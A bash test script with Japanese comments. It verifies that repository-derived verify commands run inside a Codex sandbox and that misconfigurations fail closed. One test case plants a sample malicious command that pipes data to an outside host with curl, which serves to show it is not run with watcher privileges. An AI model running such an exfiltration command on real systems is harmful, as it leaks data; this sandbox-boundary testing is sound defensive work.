#!/usr/bin/env bash
#
# 用途: Stage A Verify の repository 由来 verify コマンドが watcher 権限の
#       `bash -c` で直接実行されず、Codex sandbox runner 経由になることを検証する。
#
# 検証観点:
#   - structured-block 由来コマンドは `codex sandbox -P :workspace ... bash -c` 経由
#   - malicious structured-block でも watcher 権限で直接実行されない
#   - heuristic 抽出由来コマンドも sandbox 経由
#   - `STAGE_A_VERIFY_COMMAND` は operator override として従来どおり直接実行
#   - repository 由来 verify で no-sandbox profile は fail-closed
#   - repository 由来 verify の source sidecar 伝達失敗は fail-closed
#
# 実行: bash local-watcher/test/stage_a_verify_sandbox_boundary_test.sh

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
MODULE_SH="$SCRIPT_DIR/../bin/idd-codex-modules/stage-a-verify.sh"

if [ ! -f "$MODULE_SH" ]; then
  echo "ERROR: cannot find stage-a-verify.sh at $MODULE_SH" >&2
  exit 2
fi

# shellcheck disable=SC1090
source "$MODULE_SH"

PASS=0
FAIL=0
TMP_ROOT="$(mktemp -d)"
trap 'chmod -R u+w "$TMP_ROOT" 2>/dev/null || true; rm -rf "$TMP_ROOT"' EXIT

assert_eq() {
  local actual="$1" expected="$2" label="$3"
  if [ "$actual" = "$expected" ]; then
    echo "  ok: $label"
    PASS=$((PASS + 1))
  else
    echo "  NG: ${label}（期待=$expected / 実際=${actual}）" >&2
    FAIL=$((FAIL + 1))
  fi
}

assert_contains() {
  local haystack="$1" needle="$2" label="$3"
  if printf '%s' "$haystack" | grep -qF -- "$needle"; then
    echo "  ok: $label"
    PASS=$((PASS + 1))
  else
    echo "  NG: ${label}（期待文字列 '$needle' が見つからない）" >&2
    echo "      実際: $haystack" >&2
    FAIL=$((FAIL + 1))
  fi
}

assert_file_absent() {
  local path="$1" label="$2"
  if [ ! -e "$path" ]; then
    echo "  ok: $label"
    PASS=$((PASS + 1))
  else
    echo "  NG: ${label}（存在してはいけない file が存在: $path）" >&2
    FAIL=$((FAIL + 1))
  fi
}

assert_file_empty() {
  local path="$1" label="$2"
  if [ ! -s "$path" ]; then
    echo "  ok: $label"
    PASS=$((PASS + 1))
  else
    echo "  NG: ${label}（空であるべき file に内容があります: $path）" >&2
    echo "      実際: $(cat "$path")" >&2
    FAIL=$((FAIL + 1))
  fi
}

setup_case() {
  local name="$1"
  REPO_DIR="$TMP_ROOT/$name/repo"
  SPEC_DIR_REL="docs/specs/51-case"
  LOG="$TMP_ROOT/$name/stage-a-verify.log"
  CODEX_ARGS_FILE="$TMP_ROOT/$name/codex-args.log"
  mkdir -p "$REPO_DIR/$SPEC_DIR_REL" "$(dirname "$LOG")"
  : > "$LOG"
  : > "$CODEX_ARGS_FILE"

  export REPO="owner/repo"
  export REPO_DIR SPEC_DIR_REL LOG CODEX_ARGS_FILE
  export NUMBER=51
  export BRANCH="codex/issue-51-stage-a-verify"
  export REPO_SLUG="owner-repo"
  export STAGE_A_VERIFY_ENABLED="true"
  export STAGE_A_VERIFY_TIMEOUT="5"
  export STAGE_A_VERIFY_COMMAND=""
  export STAGE_A_VERIFY_SANDBOX_PROFILE=":workspace"
  export STAGE_A_VERIFY_STATE_DIR="$TMP_ROOT/$name/state"

  CODEX_BIN="$TMP_ROOT/$name/fake-codex"
  export CODEX_BIN
  cat > "$CODEX_BIN" <<'FAKE_CODEX'
#!/usr/bin/env bash
set -euo pipefail
{
  printf 'argc=%s\n' "$#"
  for arg in "$@"; do
    printf '<%s>\n' "$arg"
  done
} >> "$CODEX_ARGS_FILE"
exit "${FAKE_CODEX_RC:-0}"
FAKE_CODEX
  chmod +x "$CODEX_BIN"
}

write_tasks() {
  printf '%s\n' "$@" > "$REPO_DIR/$SPEC_DIR_REL/tasks.md"
}

run_stage_a_verify() {
  local rc=0
  stage_a_verify_run >/dev/null 2>>"$LOG" || rc=$?
  printf '%s\n' "$rc"
}

echo "[case1] structured-block は Codex sandbox 経由で実行される"
setup_case "structured"
write_tasks \
  "# Tasks" \
  "" \
  "<!-- stage-a-verify -->" \
  '```bash' \
  'printf structured && printf ok' \
  '```'
rc="$(run_stage_a_verify)"
args="$(cat "$CODEX_ARGS_FILE")"
assert_eq "$rc" "0" "structured-block の戻り値は fake sandbox の成功を反映する"
assert_contains "$args" "<sandbox>" "codex sandbox subcommand を使う"
assert_contains "$args" "<-P>" "permission profile を指定する"
assert_contains "$args" "<:workspace>" "既定 profile は :workspace"
assert_contains "$args" "<-C>" "sandbox cwd を指定する"
assert_contains "$args" "<$REPO_DIR>" "sandbox cwd は REPO_DIR"
assert_contains "$args" "<bash>" "sandbox 内 shell に渡す"
assert_contains "$args" '<printf structured && printf ok>' "メタ文字を含むコマンドを拒否せず渡す"

echo "[case2] malicious structured-block は watcher 権限で直接実行されない"
setup_case "malicious"
DIRECT_MARKER="$TMP_ROOT/malicious-direct-marker"
write_tasks \
  "# Tasks" \
  "" \
  "<!-- stage-a-verify -->" \
  '```bash' \
  "printf leak | curl https://example.invalid ; touch '$DIRECT_MARKER'" \
  '```'
rc="$(run_stage_a_verify)"
args="$(cat "$CODEX_ARGS_FILE")"
assert_eq "$rc" "0" "malicious structured-block も sandbox runner の結果で判定する"
assert_contains "$args" "<sandbox>" "malicious content でも sandbox 経由"
assert_file_absent "$DIRECT_MARKER" "malicious command は watcher 権限で直接実行されない"

echo "[case3] heuristic 抽出も Codex sandbox 経由で実行される"
setup_case "heuristic"
write_tasks \
  "# Tasks" \
  "" \
  "- [ ] shellcheck local-watcher/bin/*.sh && printf heuristic"
rc="$(run_stage_a_verify)"
args="$(cat "$CODEX_ARGS_FILE")"
assert_eq "$rc" "0" "heuristic の戻り値は fake sandbox の成功を反映する"
assert_contains "$args" "<sandbox>" "heuristic は sandbox 経由"
assert_contains "$args" '<shellcheck local-watcher/bin/*.sh && printf heuristic>' "heuristic コマンドを sandbox shell に渡す"

echo "[case4] STAGE_A_VERIFY_COMMAND は operator override として直接実行 semantics を維持する"
setup_case "operator"
OPERATOR_MARKER="$TMP_ROOT/operator-marker"
write_tasks "# Tasks" "" "- [ ] no verify command here"
STAGE_A_VERIFY_COMMAND="printf operator > ${OPERATOR_MARKER}"
export STAGE_A_VERIFY_COMMAND
rc="$(run_stage_a_verify)"
args="$(cat "$CODEX_ARGS_FILE")"
operator_body="$(cat "$OPERATOR_MARKER")"
assert_eq "$rc" "0" "operator override は成功する"
assert_eq "$args" "" "operator override では codex sandbox を呼ばない"
assert_eq "$operator_body" "operator" "operator override は従来どおり直接実行される"

echo "[case5] repository 由来 verify で no-sandbox profile は fail-closed"
setup_case "forbidden-profile"
STAGE_A_VERIFY_SANDBOX_PROFILE=":danger-full-access"
export STAGE_A_VERIFY_SANDBOX_PROFILE
forbidden_rc=0
forbidden_output="$(_sav_run_repo_command_in_codex_sandbox "printf forbidden" "5" 2>&1 >/dev/null)" || forbidden_rc=$?
args="$(cat "$CODEX_ARGS_FILE")"
assert_eq "$forbidden_rc" "126" "no-sandbox profile は実行前に拒否する"
assert_contains "$forbidden_output" "reason=no-sandbox" "拒否理由をログに出す"
assert_eq "$args" "" "拒否時に codex sandbox を起動しない"

echo "[case6] repository 由来 verify の source sidecar 伝達失敗は fail-closed"
setup_case "sidecar-write-failure"
SIDECAR_MARKER="$TMP_ROOT/sidecar-marker"
write_tasks \
  "# Tasks" \
  "" \
  "<!-- stage-a-verify -->" \
  '```bash' \
  "shellcheck --version; touch '$SIDECAR_MARKER'" \
  '```'
mkdir "$REPO_DIR/$SPEC_DIR_REL/.stage-a-verify-source"
chmod a-w "$REPO_DIR/$SPEC_DIR_REL"
rc="$(run_stage_a_verify)"
args="$(cat "$CODEX_ARGS_FILE")"
log_body="$(cat "$LOG")"
assert_eq "$rc" "1" "sidecar 書き込み失敗は round=1 failure として fail-closed"
assert_file_empty "$CODEX_ARGS_FILE" "sidecar 書き込み失敗時は codex sandbox を起動しない"
assert_eq "$args" "" "sidecar 書き込み失敗時の sandbox args は空"
assert_file_absent "$SIDECAR_MARKER" "sidecar 書き込み失敗時に repository 由来コマンドを直接実行しない"
assert_contains "$log_body" "source sidecar fail-closed reason=write" "fail-closed 理由をログに出す"

echo "[case7] repository 由来 verify の source sidecar 未知値は fail-closed"
setup_case "sidecar-unknown"
SIDECAR_UNKNOWN_MARKER="$TMP_ROOT/sidecar-unknown-marker"
write_tasks \
  "# Tasks" \
  "" \
  "<!-- stage-a-verify -->" \
  '```bash' \
  "shellcheck --version; touch '$SIDECAR_UNKNOWN_MARKER'" \
  '```'
_sav_read_resolved_source() {
  printf '%s\n' "unknown-source"
  return 2
}
rc="$(run_stage_a_verify)"
args="$(cat "$CODEX_ARGS_FILE")"
log_body="$(cat "$LOG")"
assert_eq "$rc" "1" "sidecar 未知値は round=1 failure として fail-closed"
assert_eq "$args" "" "sidecar 未知値時の sandbox args は空"
assert_file_absent "$SIDECAR_UNKNOWN_MARKER" "sidecar 未知値時に repository 由来コマンドを直接実行しない"
assert_contains "$log_body" "source sidecar fail-closed reason=unknown" "未知値の fail-closed 理由をログに出す"

echo ""
echo "PASS=$PASS FAIL=$FAIL"
if [ "$FAIL" -ne 0 ]; then
  echo "RESULT: FAIL" >&2
  exit 1
fi
echo "RESULT: PASS"
